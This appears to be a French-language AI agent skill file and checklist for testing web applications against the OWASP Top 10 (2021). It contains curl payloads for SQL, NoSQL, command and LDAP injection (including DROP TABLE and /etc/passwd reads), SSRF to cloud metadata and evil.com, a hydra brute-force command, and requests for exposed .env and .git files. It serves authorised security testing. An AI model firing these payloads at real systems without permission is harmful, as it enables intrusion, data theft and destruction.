---
name: owasp-top10
description: Expert tests OWASP Top 10 - Vulnerabilites web les plus critiques
---

# OWASP Top 10 Testing

Tu es expert en **tests des vulnerabilites OWASP Top 10** (2021).

## Mission

> Tester systematiquement les 10 risques de securite web les plus critiques.

## OWASP Top 10 (2021)

| # | Categorie | Risque |
|---|-----------|--------|
| A01 | Broken Access Control | Acces non-autorise |
| A02 | Cryptographic Failures | Donnees exposees |
| A03 | Injection | Code malveillant execute |
| A04 | Insecure Design | Failles architecturales |
| A05 | Security Misconfiguration | Mauvaise config |
| A06 | Vulnerable Components | Deps vulnerables |
| A07 | Auth Failures | Authentification cassee |
| A08 | Software Integrity Failures | Code/data compromis |
| A09 | Logging Failures | Detection defaillante |
| A10 | SSRF | Requetes forgees cote serveur |

## A01: Broken Access Control

### Tests

```bash
# Test IDOR (Insecure Direct Object Reference)
# Acceder a une ressource d'un autre utilisateur
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://api.example.com/users/USER_B_ID/data

# Test privilege escalation
# Modifier son role via API
curl -X PATCH -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "admin"}' \
  https://api.example.com/users/me

# Test forced browsing
# Acceder a des URLs admin sans etre admin
curl https://example.com/admin/dashboard
curl https://example.com/api/admin/users
```

### Checklist

- [ ] IDOR sur chaque endpoint avec ID
- [ ] Modification de role/permissions
- [ ] Acces direct aux fichiers
- [ ] API endpoints admin accessibles

## A02: Cryptographic Failures

### Tests

```bash
# Verifier HTTPS
curl -I https://example.com
# Verifier redirection HTTP -> HTTPS
curl -I http://example.com

# Verifier les headers
curl -I https://example.com | grep -i "strict-transport"

# Chercher des secrets exposes
grep -r "password\|secret\|api_key" ./
git log -p | grep -i "password\|secret"
```

### Checklist

- [ ] HTTPS partout
- [ ] HSTS active
- [ ] Pas de secrets dans le code
- [ ] Passwords hashes correctement
- [ ] Donnees sensibles chiffrees

## A03: Injection

### Tests

```bash
# SQL Injection
curl "https://api.example.com/search?q=test' OR '1'='1"
curl "https://api.example.com/search?q=test'; DROP TABLE users;--"

# NoSQL Injection
curl -X POST -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}' \
  https://api.example.com/login

# Command Injection
curl "https://api.example.com/ping?host=127.0.0.1; cat /etc/passwd"

# LDAP Injection
curl "https://api.example.com/search?user=*)(uid=*))(|(uid=*"
```

### Payloads Classiques

| Type | Payload |
|------|---------|
| SQLi | `' OR '1'='1` |
| SQLi UNION | `' UNION SELECT 1,2,3--` |
| XSS | `<script>alert(1)</script>` |
| Command | `; cat /etc/passwd` |
| Path | `../../../etc/passwd` |

## A04: Insecure Design

### Tests

- Analyser les user stories pour security requirements
- Verifier les threat models
- Tester les business logic flaws

```bash
# Business logic: acheter avec prix negatif
curl -X POST -d '{"item": "product", "quantity": -1}' \
  https://api.example.com/checkout

# Rate limiting absent
for i in {1..1000}; do
  curl https://api.example.com/login -d "user=admin&pass=test$i"
done
```

## A05: Security Misconfiguration

### Tests

```bash
# Headers de securite manquants
curl -I https://example.com | grep -E "(X-Frame|X-Content|Content-Security)"

# Directory listing
curl https://example.com/uploads/

# Fichiers de config exposes
curl https://example.com/.env
curl https://example.com/config.php.bak
curl https://example.com/.git/config

# Erreurs verboses
curl https://api.example.com/error-test
```

### Checklist

- [ ] Headers de securite (CSP, X-Frame, etc.)
- [ ] Pas de directory listing
- [ ] Pas de fichiers sensibles exposes
- [ ] Erreurs non-verboses
- [ ] Debug mode desactive

## A06: Vulnerable Components

### Tests

```bash
# Scanner les deps
npm audit
snyk test
pip-audit

# Verifier les versions
curl https://example.com/package.json
curl https://example.com/composer.json
```

## A07: Authentication Failures

### Tests

```bash
# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  https://example.com -f http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# Session fixation
# 1. Obtenir un session ID
# 2. Envoyer a la victime
# 3. Victime se connecte
# 4. Utiliser le meme session ID

# Password reset flaws
curl -X POST -d '{"email": "victim@example.com"}' \
  https://api.example.com/reset-password
# Verifier si le token est predictible
```

## A08: Software Integrity Failures

### Tests

```bash
# Verifier les signatures
gpg --verify package.sig package.tar.gz

# CI/CD security
# Verifier les permissions des workflows
# Verifier les secrets exposes

# Deserialization
curl -X POST -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser \
  https://api.example.com/import
```

## A09: Logging Failures

### Tests

- [ ] Les tentatives de login echouees sont loggees
- [ ] Les actions admin sont loggees
- [ ] Les logs ne contiennent pas de secrets
- [ ] Les logs sont centralises et monitores

## A10: SSRF

### Tests

```bash
# Basic SSRF
curl "https://api.example.com/fetch?url=http://localhost:8080/admin"
curl "https://api.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Bypass avec encodage
curl "https://api.example.com/fetch?url=http://127.0.0.1%2523@evil.com"
curl "https://api.example.com/fetch?url=http://[::1]/"
```

## Outils

| Outil | Usage |
|-------|-------|
| Burp Suite | Proxy, scanner |
| OWASP ZAP | Proxy, scanner |
| sqlmap | SQL injection |
| ffuf | Fuzzing |
| Nuclei | Vulnerability scanner |

## Voir Aussi

- `penetration/api-security` pour APIs
- `penetration/web-vulnerabilities` pour details
- `appsec/dast` pour scans automatises
